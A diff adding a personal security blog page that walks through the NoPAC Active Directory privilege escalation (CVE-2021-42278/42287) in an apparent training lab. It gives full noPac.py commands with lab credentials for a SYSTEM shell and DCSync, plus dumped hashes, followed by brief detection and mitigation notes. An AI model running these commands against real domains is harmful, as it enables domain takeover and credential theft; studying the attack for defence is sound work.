@@ -1,0 +1,362 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>The NoPAC Attack | vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="NoPAC is a privilege escalation vulnerability in Active Directory environments that allows an authenticated low-privileged user to impersonate any user, including Domain Admins">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta name="google-site-verification" content="-1CTZCLTxditzGFr67zWpI5-6H8z7TlZt_LuEkJaIKE" />
+
+  <meta property="og:title" content="The NoPAC Attack"/>
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  <!-- 
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+ -->
+
+  <!--  favicon/indexing -->
+  <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+  <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+  <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+  <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">vipa0z</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/index" title="Home">
+			  <i class="fa fa-home"></i>Home
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class="fa fa-archive"></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class="fa fa-folder"></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class="fa fa-tags"></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class="fa fa-user"></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a target="_blank" rel="noopener" href="https://magdy3660.gitbook.io/field-manualx/" title="Read My Manual">
+			  <i class="fa fa-file"></i>Read My Manual
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> The NoPAC Attack</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  
+		 <!-- <div class="alert alert-success description">
+			<i class="fa fa-info-circle"></i> NoPAC is a privilege escalation vulnerability in Active Directory environments that allows an authenticated low-privileged user to impersonate any user, including Domain Admins
+		 </div> alert -->
+	  		
+
+	  <p><img src="/images/NOPACK.png" alt="alt text"></p>
+<h1 id="OVERVIEW"><a href="#OVERVIEW" class="headerlink" title="__OVERVIEW"></a>__OVERVIEW</h1><p>NoPAC is a privilege escalation vulnerability in Active Directory environments that allows an authenticated low-privileged user to impersonate any user, including Domain Admins</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>42278</td>
+<td>42278 is a bypass vulnerability with the Security Account Manager (SAM).</td>
+</tr>
+<tr>
+<td>42287</td>
+<td>42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.</td>
+</tr>
+</tbody></table>
+<span id="more"></span>
+
+<h3 id="AD-Kerberos-Authentication"><a href="#AD-Kerberos-Authentication" class="headerlink" title="AD Kerberos Authentication"></a>AD Kerberos Authentication</h3><p>A ticket-granting-ticket (TGT) is a ticket assigned to a user that is used to authenticate to the KDC and request a service ticket from the ticket-granting-service (TGS). Service tickets are granted for authentication against services.<br><img src="/../images/npac.png" alt="KDC"> Figure. Kerberos authentication process</p>
+<hr>
+<h2 id="CVEs-2021-42278-and-2021-42287"><a href="#CVEs-2021-42278-and-2021-42287" class="headerlink" title="CVEs 2021-42278 and 2021-42287"></a>CVEs 2021-42278 and 2021-42287</h2><p>This vulnerability encompasses two CVEs 2021-42278 and 2021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command. Here is a quick breakdown of what each CVE provides regarding this vulnerability.</p>
+<table>
+<thead>
+<tr>
+<th>CVE</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>42278</td>
+<td>42278 is a bypass vulnerability with the Security Account Manager (SAM).</td>
+</tr>
+<tr>
+<td>42287</td>
+<td>42287 is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS.</td>
+</tr>
+</tbody></table>
+<br>
+
+<p>This exploit path takes advantage of being able to change the SamAccountName of a computer account to that of a Domain Controller. By default, authenticated users can add up to ten computers to a domain.</p>
+<p>When doing so, we change the name of the new host to match a Domain Controller’s SamAccountName. Once done, we must request Kerberos tickets causing the service to issue us tickets under the DC’s name instead of the new name. </p>
+<p>When a TGS is requested, it will issue the ticket with the closest matching name. Once done, we will have access as that service and can even be provided with a SYSTEM shell on a Domain Controller. The flow of the attack is outlined in detail in this blog post.</p>
+<p>The tickets are distributed by the Key Distribution Center (KDC). In AD environments, the KDC is installed on the Domain Controller (DC).</p>
+<p>with the attack:<br>Adversaries can leverage these two vulnerabilities together to escalate to domain admin privileges from a standard domain user.</p>
+<p>How It Works</p>
+<p>Machine account creation<br>Service Principal Names (SPNs) are cleared<br>sAMAccountName is renamed to the DC name without a $<br>Ticket-granting-ticket (TGT) is requested<br>sAMAccountName is renamed with a different name<br>Service ticket requested with S4U2self extension</p>
+<p>In November 9, 2021: Microsoft released initial security updates that addressed both CVE‑2021‑42278 (SAM spoofing) and CVE‑2021‑42287 (Kerberos PAC bypass)<br><a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/topic/kb5011266">support.microsoft.com+15</a></p>
+<h2 id="Setup"><a href="#Setup" class="headerlink" title="Setup:"></a>Setup:</h2><h4 id="Ensuring-Impacket-is-Installed"><a href="#Ensuring-Impacket-is-Installed" class="headerlink" title="Ensuring Impacket is Installed"></a>Ensuring Impacket is Installed</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ git clone https://github.com/SecureAuthCorp/impacket.git</span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ python setup.py install </span><br></pre></td></tr></table></figure>
+
+<h4 id="Cloning-the-NoPac-Exploit-Repo"><a href="#Cloning-the-NoPac-Exploit-Repo" class="headerlink" title="Cloning the NoPac Exploit Repo"></a>Cloning the NoPac Exploit Repo</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">magdy3660@htb[/htb]$ git clone https://github.com/Ridter/noPac.git</span><br></pre></td></tr></table></figure>
+<p>Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (<code>scanner.py</code>) then use the exploit (<code>noPac.py</code>) to gain a shell as <code>NT AUTHORITY/SYSTEM</code>. We can use the scanner with a standard domain user account to attempt to obtain a TGT from the target Domain Controller. If successful, this indicates the system is, in fact, vulnerable. We’ll also notice the <code>ms-DS-MachineAccountQuota</code> number is set to 10. In some environments, an astute sysadmin may set the <code>ms-DS-MachineAccountQuota</code> value to 0. If this is the case, the attack will fail because our user will not have the rights to add a new machine account. Setting this to <code>0</code> can prevent quite </p>
+<hr>
+<h4 id="Running-NoPac"><a href="#Running-NoPac" class="headerlink" title="Running NoPac"></a>Running NoPac</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap</span><br></pre></td></tr></table></figure>
+
+
+<p>We will notice that a <code>semi-interactive shell session</code> is established with the target using <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py">smbexec.py</a>. Keep in mind with smbexec shells we will need to use exact paths instead of navigating the directory structure using <code>cd</code>.</p>
+<p>It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run. We can use <code>ls</code> to confirm.</p>
+<h4 id="Confirming-the-Location-of-Saved-Tickets"><a href="#Confirming-the-Location-of-Saved-Tickets" class="headerlink" title="Confirming the Location of Saved Tickets"></a>Confirming the Location of Saved Tickets</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line"></span><br><span class="line">administrator_DC01.INLANEFREIGHT.local.ccache  noPac.py   requirements.txt  utils</span><br><span class="line">README.md  scanner.py</span><br></pre></td></tr></table></figure>
+
+<p>We could then use the ccache file to perform a pass-the-ticket and perform further attacks such as DCSync. We can also use the tool with the <code>-dump</code> flag to perform a DCSync using secretsdump.py. This method would still create a ccache file on disk, which we would want to be aware of and clean up.</p>
+<p> <code>Using noPac to DCSync the Built-in Administrator Account</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator</span><br><span class="line"></span><br><span class="line">                                                                    </span><br><span class="line">[*] Current ms-DS-MachineAccountQuota = 10</span><br><span class="line">[*] Selected Target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] will try to impersonat administrator</span><br><span class="line">[*] Alreay have user administrator ticket for target ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Pls make sure your choice hostname and the -dc-ip are same machine !!</span><br><span class="line">[*] Exploiting..</span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>
+
+<h2 id="Detection"><a href="#Detection" class="headerlink" title="Detection"></a>Detection</h2><p>Exploiting the noPac vulnerability generates the following Security Auditing Windows event logs.<br><img src="/../images/kb.png" alt="alt text"></p>
+<h2 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h2><p>Microsoft’s patch adds Security Accounts Manager Hardening changes along with Key Distribution Center (KDC) authentication updates.</p>
+<p>These changes prevent sAMAccountName spoofing by adding validation for a computer account’s sAMAccountName ending in a single dollar sign. The original requester will also be added to the PAC of the TGT, helping prevent domain controller impersonation.</p>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2025/07/12/attacking python libraries/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2025/06/20/Writing targeted password lists/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2025-07-08 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/nopac/">nopac<span>1</span></a></li> <li><a href="/tags/AD/">AD<span>2</span></a></li> <li><a href="/tags/Active-Directory/">Active Directory<span>2</span></a></li> <li><a href="/tags/Lateral-Movement/">Lateral Movement<span>2</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
